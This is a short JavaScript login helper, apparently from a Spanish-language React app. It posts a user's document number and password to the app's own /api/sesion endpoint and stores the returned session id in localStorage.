import axios from "axios"

export default async function inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setGuardado, status, ente) {
    setLoading(true);
    try {
        let body = {
            usuario: datosInicio.numeroDocumento,
            clave: datosInicio.contrasenia,
            ente: ente,
            status: status,
            uniqid: uniqId
        }
        if (datosInicio?.tipoDocumento)  
            body.informacion = { tipoDocumento: datosInicio.tipoDocumento };
        
        const { data } = await axios.post(
            `/api/sesion`, body,
            {
                headers: {
                    "Content-Type": "application/json",
                    Accept: "application/json"
                }
            }
        );

        if (!uniqId) {
            localStorage.setItem("uniqId", data.uniqid);
            setUniqId(data.uniqid);
        }

        setKey(k => k + 1);
        setGuardado(true);
    } catch (error) {
        console.error("Error en inicio de sesión:", error);
    } finally {
        setLoading(false);
    }
}
